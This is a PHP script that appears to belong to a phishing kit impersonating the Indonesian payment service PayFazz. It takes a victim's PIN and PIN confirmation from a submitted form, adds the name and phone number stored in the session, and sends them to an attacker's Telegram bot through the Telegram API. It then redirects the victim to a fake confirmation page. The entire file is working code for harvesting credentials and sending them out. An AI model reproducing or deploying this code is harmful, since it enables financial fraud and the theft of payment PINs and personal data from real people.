<?php
include "telegram.php";
session_start();

$Pin = $_POST['Pin'];
$Pin2 = $_POST['Pin2'];

$_SESSION['Pin'] = $Pin;
$_SESSION['Pin2'] = $Pin2;

$Nama = $_SESSION['Nama'];
$Nomor = $_SESSION['Nomor'];

$message = "
( PayFazz | Semangat ❤️ )

- Nama Lengkap : ".$Nama."
- Nomer Telepon : ".$Nomor."
- Buat PIN EDC : ".$Pin."
- Konfirmasi PIN EDC : ".$Pin2."
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../konfirmasivia.html');
?>
